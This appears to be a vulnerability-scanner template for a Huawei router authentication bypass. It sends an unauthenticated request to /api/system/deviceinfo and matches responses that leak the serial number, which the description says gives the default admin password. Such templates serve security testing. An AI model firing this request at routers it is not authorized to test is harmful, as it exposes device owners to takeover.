id: huawei-router-auth-bypass
info:
  author: gy741
  description: The default password of this router is the last 8 characters of the
    device's serial number which exist in the back of the device.
  name: Huawei Router Authentication Bypass
  reference:
  - https://www.exploit-db.com/exploits/48310
  severity: critical
  tags: huawei,auth-bypass,router
requests:
- matchers:
  - status:
    - 200
    type: status
  - condition: and
    type: word
    words:
    - DeviceName
    - SerialNumber
    - HardwareVersion
  matchers-condition: and
  raw:
  - 'GET /api/system/deviceinfo HTTP/1.1

    Host: {{Hostname}}

    Accept: application/json, text/javascript, */*; q=0.01

    Referer: {{BaseURL}}

    '
